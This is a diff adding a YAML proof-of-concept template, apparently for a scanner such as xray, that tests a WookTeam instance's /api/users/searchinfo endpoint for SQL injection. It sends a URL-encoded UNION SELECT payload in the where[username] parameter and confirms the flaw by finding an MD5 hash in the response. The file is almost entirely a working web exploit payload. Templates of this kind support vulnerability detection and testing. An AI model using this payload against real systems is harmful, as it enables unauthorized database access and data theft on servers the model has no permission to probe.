@@ -1,0 +1,20 @@
+name: poc-yaml-WookTeam-searchinfo-sql
+transport: http
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /api/users/searchinfo?where[username]=1%27%29+UNION+ALL+SELECT+NULL%2CCONCAT%280x7e%2CMD5%28123456%29%2C0x7e%29%2CNULL%2CNULL%2CNULL%23
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+    expression: response.status == 200 && response.body.bcontains(b'e10adc3949ba59abbe56e057f20f883e')
+
+expression: r0() 
+
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486406&idx=1&sn=c36ed1d4291668636f78de9ac24f9557&chksm=c267bef5f51037e3858cce2217b97dd1adbf6d2b52f6e65636bf4c37f9134d8b402a7d3c8954&token=1628549949&lang=zh_CN#rd
+
